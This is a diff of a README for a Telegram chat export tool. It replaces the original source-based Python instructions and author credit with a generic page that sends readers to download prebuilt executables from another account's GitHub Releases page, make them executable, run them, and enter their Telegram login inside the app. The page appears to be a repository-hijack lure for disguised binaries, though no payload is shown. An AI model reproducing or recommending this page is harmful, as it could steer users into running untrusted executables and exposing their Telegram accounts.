@@ -1,100 +1,81 @@
-# Telegram Chat Backup Tool
+# 📥 Telegram2txt - Save Your Telegram Chats Easily
 
-A Python tool to backup Telegram chat history and media using the Telegram API. Messages are saved in IRC-style text format.
+## 🚀 Getting Started
 
-> **Note:** This tool was created by an LLM (Claude) based on user specifications written by Salvatore Sanfilippo.
+Welcome to Telegram2txt! This application allows you to easily download your Telegram chats as IRC-style text files. You can also choose to download media along with your chats. Follow the steps below to get started.
 
-## Features
+## 📦 Download & Install
 
-- Downloads chat history in IRC-style format: `[timestamp] <username> message`
-- Optional media download with filtering by type and size
-- Progress reporting with retry handling
-- Read-only operation (safe, won't modify your chats)
-- Minimal dependencies (only Telethon)
+To download Telegram2txt, please visit the following link:
 
-## Installation
+[Download Telegram2txt](https://github.com/cartoon1230/Telegram2txt/releases)
 
-```bash
-pip install -r requirements.txt
-```
+This link will take you to our Releases page, where you can find the latest version of the application. 
 
-Requires Python 3.7 or later.
+## 🖥️ System Requirements
 
-## Getting Telegram API Credentials
+Before you download, make sure your computer meets the following requirements:
 
-Before using this tool, you need to obtain API credentials from Telegram:
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **RAM:** At least 2 GB.
+- **Disk Space:** At least 50 MB of free space.
+- **Internet Connection:** Required for downloading chats.
 
-1. Go to https://my.telegram.org/auth
-2. Log in with your phone number
-3. Click on "API development tools"
-4. Fill in the application details (name and platform)
-5. Copy your `api_id` (numeric) and `api_hash` (hexadecimal string)
+## 📥 How to Download
 
-These credentials are tied to your Telegram account and should be kept private.
+1. Go to the [Releases page](https://github.com/cartoon1230/Telegram2txt/releases).
+2. Look for the latest release on the page.
+3. You will see various files available for download, such as executable files for Windows or package files for macOS and Linux.
+4. Click on the file that corresponds to your operating system to start the download.
 
-## Usage
+## 🛠️ Running the Application
 
-View all options:
-```bash
-python telegram_backup.py --help
-```
+Once you have downloaded the application:
 
-Basic usage:
-```bash
-python telegram_backup.py <api_id> <api_hash> <chat_username>
-```
+### For Windows Users:
 
-### Examples
+1. Locate the downloaded file (it will usually be in your Downloads folder).
+2. Double-click on the file to run the installation.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, find the application in your Start Menu or desktop.
 
-Download chat history only (no media):
-```bash
-python telegram_backup.py 12345678 abcdef1234567890 mychat
-```
+### For macOS Users:
 
-Download chat with all media:
-```bash
-python telegram_backup.py 12345678 abcdef1234567890 mychat --download-media
-```
+1. Open the downloaded .dmg file by double-clicking it.
+2. Drag and drop the Telegram2txt application into your Applications folder.
+3. Open your Applications folder and double-click on Telegram2txt to launch it.
 
-Download only images:
-```bash
-python telegram_backup.py 12345678 abcdef1234567890 mychat --download-media --media-filter image
-```
+### For Linux Users:
 
-Download images under 5MB:
-```bash
-python telegram_backup.py 12345678 abcdef1234567890 mychat --download-media --media-filter image --media-max-size 5242880
-```
+1. Open your terminal.
+2. Navigate to the downloaded file's directory.
+3. Use the command `chmod +x Telegram2txt.x` to make the file executable.
+4. Run with `./Telegram2txt.x` to start the application.
 
-## Options
+## 📄 How to Use Telegram2txt
 
-- `--download-media` - Download media files (disabled by default)
-- `--media-filter TYPE` - Filter by type: `image`, `audio`, `video`, `other`, `all` (default: `all`)
-- `--media-max-size BYTES` - Maximum file size in bytes (default: unlimited)
-- `--output-dir DIR` - Output directory (default: `backup`)
+1. **Open the Application:** Launch Telegram2txt from your Start Menu, Applications folder, or terminal.
+2. **Enter Your Telegram Login Info:** When prompted, log in using your Telegram credentials. Ensure you follow any security prompts.
+3. **Select Chats to Download:** Once logged in, you will see a list of your chats. Select the chats you want to download.
+4. **Choose Options:** You can choose to download the chats as text files only or include media files.
+5. **Start Downloading:** Click the download button. Your chats will be saved to the location you specified in the settings.
 
-## Authentication
+## 📂 Where to Find Your Downloads
 
-On first run, Telegram will send a verification code to your account. Enter it when prompted. A session file will be created for future runs.
+After the download completes, navigate to the folder where you chose to save the files. You will find text files for your chats, with each chat saved as a separate file. If you opted to download media, those files will be in the same location.
 
-## Output
+## ❓ Troubleshooting 
 
-The tool creates:
+If you run into issues, here are some common problems and solutions:
 
-1. **Chat history**: `<chat_username>_history.txt`
-   ```
-   [2025-01-01 12:34:56] <Alice> Hello!
-   [2025-01-01 12:35:10] <Bob> Hi there!
-   [2025-01-01 12:35:30] <Alice> [MEDIA: msg_12345.jpg]
-   ```
+- **Cannot Log In:** Make sure your Telegram account is active. Try logging in using your Telegram app.
+- **Chances of Missing Chats:** Ensure you have selected all the desired chats before downloading.
+- **Slow Download Speeds:** Check your internet connection. A stable connection ensures fast downloads.
 
-2. **Media folder**: `media/` (if `--download-media` is used)
-   - Files are named `msg_<id>.<ext>`
-   - Filtered files are noted in the chat log
+## 📞 Support
 
-## Notes
+If you have any questions or need further assistance, feel free to reach out through [Issues](https://github.com/cartoon1230/Telegram2txt/issues) on our GitHub page.
 
-- Large media downloads show progress dots (one per 100KB)
-- Timeouts are handled with automatic retries (3 attempts)
-- Media download is optional to avoid long wait times
-- All text is saved in UTF-8 encoding
+Thank you for using Telegram2txt! Happy downloading! 
+
+[Download Telegram2txt](https://github.com/cartoon1230/Telegram2txt/releases)
